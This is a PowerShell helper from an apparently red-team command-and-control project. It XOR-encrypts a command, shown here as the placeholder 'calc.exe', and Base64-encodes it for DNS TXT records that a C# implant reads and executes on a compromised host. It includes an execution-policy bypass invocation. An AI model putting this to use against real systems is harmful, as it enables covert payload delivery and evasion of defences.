<#
Powershell script to XOR payloads with a key and then Base64 encode them ready to be stored in DNS TXT records for retrieval by Coyote C# implant
https://github.com/TartarusLabs/Coyote
james.fell@tartaruslabs.com

To execute it: powershell.exe -Exec bypass -File payload-encrypt.ps1

Refer to the README.md for full usage details
#>

$Payload = "calc.exe"	# Set the command you would like to execute on the compromised endpoint here
$XORkey = "pizza"	# Set an XOR key here and remember to use the same one in coyote.cs for decryption

$keychar = 0
$XORkeyar = $XORkey.ToCharArray()
$ciphertext = ""

$Payload.ToCharArray() | foreach-object -process {
	$ciphertext += [char]([byte][char]$_ -bxor $XORkeyar[$keychar])
	$keychar += 1
	if ($keychar -eq $XORkey.Length) 
	{
		$keychar = 0
	}
}

Write-Host "Encrypted payload for DNS TXT record: $([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($ciphertext)))"
